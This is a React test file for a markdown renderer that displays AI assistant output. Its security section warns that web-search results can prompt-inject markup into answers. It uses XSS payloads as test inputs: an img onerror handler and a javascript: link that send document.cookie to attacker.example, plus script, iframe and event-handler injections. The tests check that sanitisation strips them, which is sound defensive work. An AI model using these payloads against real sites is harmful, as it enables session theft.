import { describe, it, expect, vi, afterEach } from 'vitest';
import { render, screen, act, within, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import MarkdownRenderer from '../MarkdownRenderer';

/**
 * MarkdownRenderer turns assistant output (LLM text, which can be steered by
 * web-search results) into HTML via marked and React's raw-HTML prop.
 */

function md(content: string | undefined) {
  return render(<MarkdownRenderer content={content as string} />);
}

describe('MarkdownRenderer', () => {
  afterEach(() => {
    vi.useRealTimers();
  });

  describe('markdown', () => {
    it('renders headings, emphasis, lists and inline code', () => {
      md('## Voice rules\n\nAnswer **first**, then *stop*.\n\n1. One\n2. Two\n\n- Use `--accent`');
      expect(screen.getByRole('heading', { level: 2, name: 'Voice rules' })).toBeInTheDocument();
      expect(screen.getByText('first', { selector: 'strong' })).toBeInTheDocument();
      expect(screen.getByText('stop', { selector: 'em' })).toBeInTheDocument();
      const lists = screen.getAllByRole('list');
      expect(lists[0].tagName).toBe('OL');
      expect(within(lists[0]).getAllByRole('listitem')).toHaveLength(2);
      expect(screen.getByText('--accent', { selector: 'code' })).toBeInTheDocument();
    });

    it('renders links as real anchors', () => {
      md('See [the spec](https://example.com/spec).');
      expect(screen.getByRole('link', { name: 'the spec' })).toHaveAttribute('href', 'https://example.com/spec');
    });

    it('wraps GFM tables in a horizontal scroll container and keeps column alignment', () => {
      const { container } = md('| Token | Value |\n|:------|------:|\n| `--space-4` | 16px |');
      const wrapper = container.querySelector('.table-scroll-wrapper');
      expect(wrapper).not.toBeNull();
      const table = within(wrapper as HTMLElement).getByRole('table');
      expect(within(table).getAllByRole('columnheader').map(th => th.textContent)).toEqual(['Token', 'Value']);
      expect(within(table).getByRole('columnheader', { name: 'Token' })).toHaveStyle({ textAlign: 'left' });
      expect(within(table).getByRole('cell', { name: '16px' })).toHaveStyle({ textAlign: 'right' });
      // Inline markdown inside cells is rendered
      expect(within(table).getByText('--space-4', { selector: 'code' })).toBeInTheDocument();
    });

    it('renders nothing for empty or missing content', () => {
      const { container } = md(undefined);
      expect(container.firstChild).toBeEmptyDOMElement();
    });

    it('re-renders as streamed content grows', () => {
      const { rerender } = md('Partial');
      rerender(<MarkdownRenderer content={'Partial **answer**'} />);
      expect(screen.getByText('answer', { selector: 'strong' })).toBeInTheDocument();
    });
  });

  describe('code blocks', () => {
    it('shows the language, escapes the code and offers a copy button', () => {
      const { container } = md('```tsx\nconst el = <div className="x">hi</div>;\n```');
      const block = container.querySelector('.code-block-wrapper') as HTMLElement;
      expect(within(block).getByText('tsx')).toHaveClass('code-block-lang');
      const code = block.querySelector('pre code') as HTMLElement;
      expect(code).toHaveClass('language-tsx');
      // Code is shown as text, never parsed into elements
      expect(code.textContent).toBe('const el = <div className="x">hi</div>;');
      expect(code.querySelector('div')).toBeNull();
      expect(within(block).getByRole('button', { name: 'Copy code' })).toBeInTheDocument();
    });

    it('labels fenced blocks without a language as "code"', () => {
      const { container } = md('```\nplain\n```');
      expect(container.querySelector('.code-block-lang')).toHaveTextContent('code');
      expect(container.querySelector('pre code')).not.toHaveAttribute('class');
    });

    it('copies the raw code and briefly confirms', async () => {
      vi.useFakeTimers({ shouldAdvanceTime: true });
      const user = userEvent.setup({ advanceTimers: vi.advanceTimersByTime });
      md('```css\n.btn { color: var(--accent); }\n```');

      await user.click(screen.getByRole('button', { name: 'Copy code' }));

      expect(await navigator.clipboard.readText()).toBe('.btn { color: var(--accent); }');
      await waitFor(() => expect(screen.getByRole('button', { name: 'Copy code' })).toHaveTextContent('Copied'));

      act(() => { vi.advanceTimersByTime(2000); });
      expect(screen.getByRole('button', { name: 'Copy code' })).toHaveTextContent('Copy');
    });

    it('copies the right block when there are several', async () => {
      const user = userEvent.setup();
      md('```js\nfirst()\n```\n\n```js\nsecond()\n```');
      await user.click(screen.getAllByRole('button', { name: 'Copy code' })[1]);
      expect(await navigator.clipboard.readText()).toBe('second()');
    });

    it('renders cf-preview blocks as live component previews', () => {
      const { container } = md('```cf-preview\n<button class="btn btn-primary">Save</button>\n```');
      const preview = container.querySelector('.cf-preview') as HTMLElement;
      expect(within(preview).getByRole('button', { name: 'Save' })).toHaveClass('btn', 'btn-primary');
      expect(container.querySelector('.code-block-wrapper')).toBeNull();
    });
  });

  // Assistant text is untrusted: the chat has web search, so a hostile page
  // can prompt-inject markup into an answer. marked does not sanitise, so its
  // output goes through sanitizeHtml (DOMPurify plus a style filter).
  describe('security: untrusted assistant output', () => {
    it('raw <img onerror> in a response does not become a live element with an event handler', () => {
      const { container } = md('Here you go <img src="x" onerror="window.__pwned = document.cookie">');
      expect(container.querySelector('[onerror]')).toBeNull();
    });

    it('<script> and <iframe> tags in a response are not inserted into the page', () => {
      const { container } = md('Done.\n\n<script>alert(1)</script>\n\n<iframe src="https://attacker.example/phish"></iframe>');
      expect(container.querySelector('script, iframe')).toBeNull();
    });

    it('markdown links cannot use the javascript: protocol', () => {
      md('[Open the docs](javascript:fetch("https://attacker.example/?c="+document.cookie))');
      const link = screen.queryByRole('link', { name: 'Open the docs' });
      expect(link?.getAttribute('href') ?? '').not.toMatch(/^\s*javascript:/i);
    });

    it('cf-preview blocks cannot smuggle event-handler attributes', () => {
      const { container } = md('```cf-preview\n<div class="card" onmouseover="alert(1)">Card</div>\n```');
      expect(container.querySelector('[onmouseover]')).toBeNull();
    });

    it('escapes HTML inside ordinary fenced code blocks', () => {
      const { container } = md('```html\n<img src=x onerror=alert(1)>\n```');
      expect(container.querySelector('img')).toBeNull();
      expect(container.querySelector('pre code')).toHaveTextContent('<img src=x onerror=alert(1)>');
    });
  });

  // Fixed (was src/components/MarkdownRenderer.tsx:13-42): inline links in an
  // answer have no target, so clicking one navigates the whole tab away. On
  // the public landing page the chat is ephemeral (React state only), so the
  // conversation is destroyed. The citation footer already uses
  // target="_blank" rel="noopener noreferrer"; inline links should match.
  it('inline answer links open in a new tab like citation links do', () => {
    md('Read [WCAG 2.2](https://www.w3.org/TR/WCAG22/).');
    const link = screen.getByRole('link', { name: 'WCAG 2.2' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
  });
});
